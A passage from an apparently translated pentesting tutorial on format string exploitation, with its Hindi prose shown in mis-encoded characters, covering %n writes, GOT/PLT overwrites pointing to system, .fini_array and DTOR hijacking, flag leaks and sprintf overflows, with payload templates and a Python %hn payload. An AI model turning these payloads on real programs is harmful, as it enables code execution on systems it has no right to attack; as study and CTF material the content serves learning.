**`%n`** **рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрддреЗ рдореЗрдВ рд▓рд┐рдЦреЗ рдЧрдП рдмрд╛рдЗрдЯреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛** рдХреЛ **рд▓рд┐рдЦрддрд╛ рд╣реИред** рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рддрдиреЗ **рд╣реЗрдХреНрд╕ рдирдВрдмрд░** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ **рдмрд╛рдЗрдЯ** рд▓рд┐рдЦрдирд╛ рд╣реИ, рдпрд╣реА рддрд░реАрдХрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЖрдк **рдХрд┐рд╕реА рднреА рдбреЗрдЯрд╛** рдХреЛ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред
```bash
AAAA%.6000d%4\$n тАФ> Write 6004 in the address indicated by the 4┬║ param
AAAA.%500\$08x тАФ> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

рдпрд╣ рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬреЛ рдХрд╛рд░реНрдпрдХреНрд░рдо рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдмрд╛рд╣реНрдп рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рдкрддреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддрд╛ рд╣реИред

рдЗрд╕ рддрд╛рд▓рд┐рдХрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ: `objdump -s -j .got ./exec`

![](<../../.gitbook/assets/image (619).png>)

GEF рдореЗрдВ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ GOT рдореЗрдВ рдХреМрди-рдХреМрди рд╕реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ: `gefтЮд x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEF рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдбреАрдмрдЧрд┐рдВрдЧ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ `got` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП GOT рддрд╛рд▓рд┐рдХрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (621).png>)

рдПрдХ рдмрд╛рдЗрдирд░реА рдореЗрдВ GOT рдореЗрдВ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рд╣реЛрддреЗ рд╣реИрдВ рдпрд╛ PLT рдЦрдВрдб рдХреЗ рдкрддреЗ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдлрд╝рдВрдХреНрд╢рди рдкрддреЗ рдХреЛ рд▓реЛрдб рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд╣реИ рдХрд┐рд╕реА рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдирд╛ рдЬреЛ рдмрд╛рдж рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ `system` рдлрд╝рдВрдХреНрд╢рди рдХреЗ PLT рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рдеред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, рдЖрдк рдЙрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ (рддрд╛рдХрд┐ рдЖрдк рд╕рд┐рд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХреЛ рднреЗрдЬреЗ рдЧрдП рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХреЗрдВ)ред

рдпрджрд┐ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рджреНрд╡рд╛рд░рд╛ `system` рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╕рд┐рд╕реНрдЯрдо рдлрд╝рдВрдХреНрд╢рди рдХрд╛ GOT рдореЗрдВ рдХреЛрдИ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдирд╣реАрдВ рд╣реЛрдЧреАред рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред

**Procedure Linkage Table** рдПрдХ ELF рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рдХреЗрд╡рд▓ рдкрдардиреАрдп рддрд╛рд▓рд┐рдХрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдкреНрд░рддреАрдХ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рд╕рдорд╛рдзрд╛рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЬрдм рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ GOT рдлреНрд▓реЛ рдХреЛ PLT рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХреЗ рдФрд░ рдЗрд╕реЗ GOT рдкрд░ рд▓рд┐рдЦ рд╕рдХреЗред рдлрд┐рд░, рдЙрд╕ рдкрддреЗ рдкрд░ рдЕрдЧрд▓реА рдмрд╛рд░ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдлрд╝рдВрдХреНрд╢рди рд╕реАрдзреЗ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдмрд┐рдирд╛ рдЗрд╕реЗ рд╕рдорд╛рдзрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЗред

рдЖрдк PLT рдкрддреЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдЗрд╕рдХреЗ рд╕рд╛рде **`objdump -j .plt -d ./vuln_binary`**

### **рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдлреНрд▓реЛ**

рдЬреИрд╕рд╛ рдкрд╣рд▓реЗ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓рдХреНрд╖реНрдп рд╣реЛрдЧрд╛ рдХрд┐ рдмрд╛рдж рдореЗрдВ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ GOT рддрд╛рд▓рд┐рдХрд╛ рдореЗрдВ рдкрддреЗ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░рдирд╛ред рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рд╣рдо рдПрдХ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдЦрдВрдб рдореЗрдВ рд╕реНрдерд┐рдд рдПрдХ рд╢реИрд▓рдХреЛрдб рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЙрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЖрдк рдПрдХ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓ рдЦрдВрдб рдореЗрдВ рдПрдХ рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдВрдЧреЗред\
рддреЛ рдПрдХ рд╡рд┐рднрд┐рдиреНрди рд╡рд┐рдХрд▓реНрдк рд╣реИ рдХрд┐ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдб рдХрд░реЗрдВ рдЬреЛ рдЕрдкрдиреЗ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ `system` рдлрд╝рдВрдХреНрд╢рди рдХреА рдУрд░ рд╕рдВрдХреЗрддрд┐рдд рдХрд░реЗрдВред

рдкрддрд╛ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдо рддреМрд░ рдкрд░ 2 рдХрджрдо рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ: рдЖрдк рдкрд╣рд▓реЗ 2 рдмрд╛рдЗрдЯ рд▓рд┐рдЦрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рджреВрд╕рд░реЗ 2ред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `$hn` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

HOB рдкрддреЗ рдХреЗ 2 рдЙрдЪреНрдЪ рдмрд╛рдЗрдЯ рдХреЛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ\
LOB рдкрддреЗ рдХреЗ 2 рдирд┐рдЪрд▓реЗ рдмрд╛рдЗрдЯ рдХреЛ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЗрд╕рд▓рд┐рдП, рдХреНрдпреЛрдВрдХрд┐ рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рд╕рдмрд╕реЗ рдЫреЛрдЯрд╛ рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ [HOB, LOB] рдФрд░ рдлрд┐рд░ рджреВрд╕рд░рд╛ред

рдпрджрд┐ HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

рдпрджрд┐ HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB_shellcode-8 N┬║Param_dir_HOB LOB_shell-HOB_shell N┬║Param_dir_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдЯреЗрдореНрдкрд▓реЗрдЯ**

рдЖрдк рдпрд╣рд╛рдБ рд╕реЗ рдлрд╝реЙрд░реНрдореЗрдЯ-рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ GOT рдХрд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### **.fini_array**

рдореВрд▓ рд░реВрдк рд╕реЗ рдпрд╣ рдПрдХ рд╕рдВрд░рдЪрдирд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реЛрддреЗ рд╣реИрдВред рдпрд╣ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдЕрдЧрд░ рдЖрдк рдПрдХ рдкрддреЗ рдкрд░ рдЬрд╛рдХрд░ рдЕрдкрдирд╛ рд╢реИрд▓рдХреЛрдб рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдпрд╛ рдЙрди рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдкрдХреЛ рдореБрдЦреНрдп рдореЗрдВ рдлрд┐рд░ рд╕реЗ рдЬрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдЖрдк рджреВрд╕рд░реА рдмрд╛рд░ рдлрд╝реЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░ рд╕рдХреЗрдВред
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ **рдПрдХ рдЕрдирдВрдд рд▓реВрдк рдирд╣реАрдВ рдмрдирд╛рдПрдЧрд╛** рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЖрдк рдореБрдЦреНрдп рдореЗрдВ рд╡рд╛рдкрд╕ рдЖрддреЗ рд╣реИрдВ, рдХреИрдиреЗрд░реА рдХреЛ рдзреНрдпрд╛рди рдЬрд╛рдПрдЧрд╛, рд╕реНрдЯреИрдХ рдХрд╛ рдЕрдВрдд рдХреНрд╖рддрд┐рдЧреНрд░рд╕реНрдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдлрд┐рд░ рд╕реЗ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП рдЗрд╕рдХреЗ рд╕рд╛рде рдЖрдкрдХреЛ рд╡рд▓реНрди рдХрд╛ рдПрдХ рдЕрдзрд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рд╣реЛрдЧрд╛ред

### **рдХрдВрдЯреЗрдВрдЯ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ**

рдПрдХ рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рдореЗрдореЛрд░реА рд╕реЗ **рдХрдВрдЯреЗрдВрдЯ рдбрдВрдк** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рд╕реНрдЯреИрдХ рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдЪрд░рдг рд╣реИ рдЬреЛ рдПрдХ рдЭрдВрдбрд╛ рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИред** рдпрджрд┐ рдЖрдкрдХреЛ **рдореЗрдореЛрд░реА** рдореЗрдВ **рдЭрдВрдбрд╛** рдХреЗ **рдкреЙрдЗрдВрдЯрд░** рдХрд╛ рд╕реНрдерд╛рди рдкрддрд╛ рдЪрд▓ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдкреНрд░рд┐рдВрдЯрдлрд╝** рдХреЛ рдЙрд╕ **рдкрддреЗ** рддрдХ рдкрд╣реБрдВрдЪрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЭрдВрдбрд╛** рдХреЛ **рдкреНрд░рд┐рдВрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

рдЗрд╕рд▓рд┐рдП, рдЭрдВрдбрд╛ **0xffffcf4c** рдореЗрдВ рд╣реИ

![](<../../.gitbook/assets/image (618) (2).png>)

рдФрд░ рд▓реАрдХ рд╕реЗ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **рдЭрдВрдбреЗ рдХрд╛ рдкреЙрдЗрдВрдЯрд░** **8рд╡рд╛рдВ** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рд╣реИ:

![](<../../.gitbook/assets/image (623).png>)

рдЗрд╕рд▓рд┐рдП, **8рд╡реЗрдВ рдкреИрд░рд╛рдореАрдЯрд░** рддрдХ рдкрд╣реБрдВрдЪрдХрд░ рдЖрдк рдЭрдВрдбрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (624).png>)

**рдкрд┐рдЫрд▓реЗ рдЙрддреНрдкреАрдбрд╝рди** рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП рдФрд░ рдпрд╣ рдЕрдиреБрднрд╡ рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдЖрдк **рдХрдВрдЯреЗрдВрдЯ рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк **`printf`** рдХреЛ рдЙрд╕ рд╕реЗрдХреНрд╢рди рдореЗрдВ **рд╕реЗрдЯ рдкреЙрдЗрдВрдЯрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓** рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ **рдкреВрд░реА рддрд░рд╣** рд╕реЗ **рдбрдВрдк** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### **DTOR**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЛ рдбреАрдЯреАрдУрдЖрд░ рдЦрдВрдб рдХреЗ рд╕рд╛рде рдкрд╛рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

рдбрд┐рд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡реЗ рдлрд╝рдВрдХреНрд╢рди рд╣реИрдВ рдЬреЛ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддреЗ рд╣реИрдВред\
рдпрджрд┐ рдЖрдк **`__DTOR_END__`** рдореЗрдВ рдПрдХ **рд╢реИрд▓рдХреЛрдб** рдХреЗ рд▓рд┐рдП **рдПрдбреНрд░реЗрд╕ рд▓рд┐рдЦрдиреЗ** рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣ **рдХрд╛рд░реНрдпрдХреНрд░рдо рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред\
рдЗрд╕ рд╕реЗрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ:
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep тАЬ__DTORтАЭ
```
рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрдкрдХреЛ **DTOR** рдЦрдВрдб **`ffffffff`** рдФрд░ **`00000000`** рдХреЗ рдордзреНрдп рдореЗрдВ рдкрд╛рдПрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЖрдк рд╕рд┐рд░реНрдл рдЙрди рдорд╛рдиреЛрдВ рдХреЛ рджреЗрдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреЛрдИ рдлрд╝рдВрдХреНрд╢рди рд░рдЬрд┐рд╕реНрдЯрд░ рдирд╣реАрдВ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП **`00000000`** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ **рд╢реЗрд▓рдХреЛрдб рдХреЗ рдкрддреЗ** рдХреЗ рд╕рд╛рде **рдПрдХреНрд╕реАрдХреНрдпреВрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

### **рдлреЙрд░реНрдореЗрдЯ рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реЗ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдирд╛**

**sprintf** рдПрдХ рдлреЙрд░реНрдореЗрдЯреЗрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдПрдХ **рд╡реЗрд░рд┐рдПрдмрд▓** рдореЗрдВ **рд▓реЗ рдЬрд╛рддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ **рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдкреЗрд▓реЛрдб `%.44xAAAA` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ **44B+"AAAA" рд▓рд┐рдЦреЗрдЧрд╛**, рдЬреЛ рдПрдХ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### **\_\_atexit рд╕рдВрд░рдЪрдирд╛рдПрдБ**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

**`atexit()`** рдПрдХ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреНрдп рдлрд╝рдВрдХреНрд╢рдиреЗрдВ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕ рдХреА рдЬрд╛рддреА рд╣реИрдВ**ред рдпреЗ **рдлрд╝рдВрдХреНрд╢рдиреЗрдВ** рдЬрдм **`exit()`** рдпрд╛ **рдореБрдЦреНрдп** рдХрд╛ **рд░рд┐рдЯрд░реНрди** рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдПрдХреНрд╕реАрдХреНрдпреВрдЯ** рд╣реЛрдВрдЧреАред\
рдЕрдЧрд░ рдЖрдк рдХрд┐рд╕реА рднреА рдЗрди **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ** рдХреЗ **рдкрддреЗ** рдХреЛ рдПрдХ рд╢реЗрд▓рдХреЛрдб рдХреА рдУрд░ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХрд╛ **рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд** рдХрд░реЗрдВрдЧреЗ, рд▓реЗрдХрд┐рди рдпрд╣ рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рд╣реИред\
рд╡рд░реНрддрдорд╛рди рдореЗрдВ **рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ** рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдЕрдВрддрддрдГ рдЬрд┐рди рдкрддреЛрдВ рдХреА рдУрд░ рдпрд╣ рдкреЙрдЗрдВрдЯ рдХрд░рддреЗ рд╣реИрдВ, рд╡реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЛрдВ рдирд╣реАрдВ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **XOR** рдФрд░ **рд░реИрдВрдбрдо рдХреБрдВрдЬреА** рдХреЗ рд╕рд╛рде **рд╡рд┐рд╕реНрдерд╛рдкрди** рдХреЗ рд╕рд╛рде рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рд╣реИрдВред рдЗрд╕рд▓рд┐рдП рд╡рд░реНрддрдорд╛рди рдореЗрдВ рдпрд╣ рд╣рдорд▓рд╛ рд╡реЗрдХреНрдЯрд░ **рдХрдо рдЙрдкрдпреЛрдЧреА рд╣реИ рдХрдо рд╕реЗ рдХрдо x86** рдФрд░ **x64\_86** рдкрд░ред\
**рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдлрд╝рдВрдХреНрд╢рди** рд╣реИ **`PTR_MANGLE`**ред **рдЕрдиреНрдп рд╡рд╛рд╕реНрддреБрдХрд▓рд╛** рдЬреИрд╕реЗ m68k, mips32, mips64, aarch64, arm, hppa... **рдЗрд╕ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **рдирд╣реАрдВ рд▓рд╛рдЧреВ** рдХрд░рддреЗ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рд╡рд╣реА рд╡рд╛рдкрд╕ рджреЗрддрд╛ рд╣реИ** рдЬреИрд╕рд╛ рдХрд┐ рдЗрд╕реЗ рдЗрдирдкреБрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рд▓рд┐рдП рдЗрди рд╡рд╛рд╕реНрддреБрдХрд▓рд╛рдУрдВ рдкрд░ рдпрд╣ рд╡реЗрдХреНрдЯрд░ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрдХреНрд░рдордг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **setjmp() & longjmp()**

{% hint style="danger" %}
рдЖрдЬрдХрд▓ рдЗрд╕реЗ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд░рдирд╛ рдмрд╣реБрдд **рдЕрдЬреАрдм** рд╣реИред
{% endhint %}

